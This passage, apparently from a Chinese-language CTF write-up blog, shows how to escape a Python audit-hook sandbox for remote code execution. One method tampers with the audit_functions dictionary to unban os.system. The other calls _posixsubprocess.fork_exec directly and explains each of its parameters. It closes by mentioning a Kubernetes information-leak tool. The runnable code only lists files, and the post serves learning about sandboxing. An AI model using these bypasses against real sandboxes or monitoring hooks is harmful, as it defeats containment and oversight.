# {&#39;event&#39;: &#39;os.system&#39;, &#39;args&#39;: (b&#39;ls&#39;,), &#39;audit_functions&#39;: {&#39;os.system&#39;: {&#39;ban&#39;: False}, ... }}
```

修改 audit_functions 字典，/pardon `os.system` （什么方块人）

然后继续执行 `print(*args)` ，这样就实现了 rce

或者

可以用 `_posixsubprocess.fork_exec` 

&gt; `posixsubprocess` 是内部模块，核心功能是 `fork_exec` 函数，提供了一个非常底层的方式创建子进程，并在子进程中执行指定程序

```python
import os
import _posixsubprocess

cmd = b&#34;/bin/ls&#34;
param = &#34;.&#34;
_posixsubprocess.fork_exec([cmd, param], [cmd], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False)
```

网上搜来的，一堆参数一眼看不明白，查查源码，每个版本之间可能有差异

```python
# _posixsubprocess.py
def fork_exec(*args, **kwargs): # real signature unknown
    &#34;&#34;&#34;
    Spawn a fresh new child process.
    
    Fork a child process, close parent file descriptors as appropriate in the
    child and duplicate the few that are needed before calling exec() in the
    child process.
    
    If close_fds is True, close file descriptors 3 and higher, except those listed
    in the sorted tuple pass_fds.
    
    The preexec_fn, if supplied, will be called immediately before closing file
    descriptors and exec.
    
    WARNING: preexec_fn is NOT SAFE if your application uses threads.
             It may trigger infrequent, difficult to debug deadlocks.
    
    If an error occurs in the child process before the exec, it is
    serialized and written to the errpipe_write fd per subprocess.py.
    
    Returns: the child process&#39;s PID.
    
    Raises: Only on an error in the parent process.
    &#34;&#34;&#34;
    pass
# _posixsubprocess.pyi
    def fork_exec(
        args: Sequence[StrOrBytesPath] | None,
        executable_list: Sequence[bytes],
        close_fds: bool,
        pass_fds: tuple[int, ...],
        cwd: str,
        env: Sequence[bytes] | None,
        p2cread: int,
        p2cwrite: int,
        c2pread: int,
        c2pwrite: int,
        errread: int,
        errwrite: int,
        errpipe_read: int,
        errpipe_write: int,
        restore_signals: int,
        call_setsid: int,
        pgid_to_set: int,
        gid: SupportsIndex | None,
        extra_groups: list[int] | None,
        uid: SupportsIndex | None,
        child_umask: int,
        preexec_fn: Callable[[], None],
        allow_vfork: bool,
        /,
    ) -&gt; int: ...
```

对应起来：

```python
Sequence[StrOrBytesPath] | None 		= [cmd, param]
executable_list: Sequence[bytes]		= [cmd]
close_fds: bool							= True
pass_fds: tuple[int, ...]				= ()
cwd: str								= None
env: Sequence[bytes] | None				= None
p2cread: int							= -1
p2cwrite: int							= -1
c2pread: int							= -1
c2pwrite: int							= -1
errread: int							= -1
errwrite: int							= -1
errpipe_read: int						= *(os.pipe())[0]
errpipe_write: int						= *(os.pipe())[1]
restore_signals: int					= False
call_setsid: int						= False
pgid_to_set: int						= False
gid: SupportsIndex | None				= None
extra_groups: list[int] | None			= None
uid: SupportsIndex | None				= None
child_umask: int						= -1
preexec_fn: Callable[[], None]			= None
allow_vfork: bool						= False
```

把无效的配置去掉，得到

```python
Sequence[StrOrBytesPath] | None 		= [cmd, param]		# 命令及参数
executable_list: Sequence[bytes]		= [cmd]				# 命令路径
# os.pipe()创建一个 pipe ，返回两个文件描述符
errpipe_read: int						= *(os.pipe())[0]   
errpipe_write: int						= *(os.pipe())[1]
```

这样也能实现 rce

#### 0x01 k8s 信息泄漏

wp 说用 k8spider：https://github.com/Esonhugh/k8spider

环境没配好，k8s 之后再说


---

> 作者: [M1ng2u](https://m1ng2u.github.io/)  
> URL: http://localhost:1313/posts/cc76721/  

